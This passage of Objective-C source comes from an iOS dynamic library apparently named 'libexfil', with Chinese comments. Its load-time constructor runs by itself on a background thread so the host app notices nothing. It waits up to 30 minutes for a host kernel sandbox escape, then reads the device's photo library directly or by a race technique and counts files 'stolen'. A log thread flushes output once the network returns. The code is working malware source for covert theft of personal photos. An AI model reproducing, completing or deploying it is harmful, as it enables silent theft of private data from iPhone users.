                    d, img, exts[e]];
                for (int a = 0; a < 3 && !got; a++)
                {
                    got = exfilTryRace(target, race[e], sym[e], decoy, delays[a]);
                    usleep(2000);
                }
            }
            if (got) stolen++;
        }
    }
    exfilLog(@"race mode done, stolen=%d", stolen);
}

#pragma mark - 入口（constructor：dylib 载入即跑，不依赖宿主调用）

static void exfilRun(void)
{
    @autoreleasepool
    {
        exfilLog(@"ctor alive, machine=%@ ios=%@ bundle=%@",
                 exfilMachineName(), [UIDevice currentDevice].systemVersion,
                 [[NSBundle mainBundle] bundleIdentifier]);
        // 0) 长轮询等宿主 pe_v2 内核逃逸生效（宿主启动即自动跑，异步需要时间）：
        //    MCM 探测 + DCIM 可读性每 5 秒一轮，坚持 30 分钟；
        //    宿主沙盒一旦摘掉，MCM 查询即被放行（denied → ok）
        NSString *mcmMedia = nil;
        BOOL escapeSeen = NO;
        int escapeSeenLogged = 0;
        const int kPollSeconds = 30 * 60;
        for (int i = 0; i < kPollSeconds && !mcmMedia; i += 5)
        {
            mcmMedia = exfilMCMPhotosMediaDir();
            if (mcmMedia) break;

            BOOL escaped = exfilSandboxEscaped();
            if (escaped && !escapeSeen)
            {
                escapeSeen = YES;
                exfilLog(@"poll: sandbox escape ACTIVE after %ds, MCM still retrying", i);
            }
            if (escaped && !mcmMedia && escapeSeenLogged < 3)
            {
                // 逃逸已生效但 MCM 未命中：直接走直读，别再磨
                escapeSeenLogged++;
                exfilLog(@"poll: escape active, going direct mode");
                break;
            }
            sleep(5);
        }
        if (mcmMedia)
        {
            exfilLog(@"path 0: MCM photos media=%@", mcmMedia);
            exfilScanMediaUnder(mcmMedia);
            exfilLog(@"path 0 done");
            return;
        }

        // 1) 逃逸已生效（MCM 未命中）→ 直读
        if (escapeSeen)
        {
            exfilDirectMode();
            return;
        }

        // 2) 30 分钟没等到：最后再确认一次 DCIM
        if (exfilSandboxEscaped())
        {
            exfilDirectMode();
            return;
        }
        exfilLog(@"poll: escape never became active after %ds, race mode", kPollSeconds);
        exfilRaceMode();
    }
}

__attribute__((constructor))
static void libexfilEntry(void)
{
    // 启动日志补发线程（网络恢复后把启动期丢的日志冲出去）
    exfilLogFlushLoop();
    // 立刻甩到后台线程，绝不阻塞宿主启动
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_UTILITY, 0), ^{
        exfilRun();
    });
}
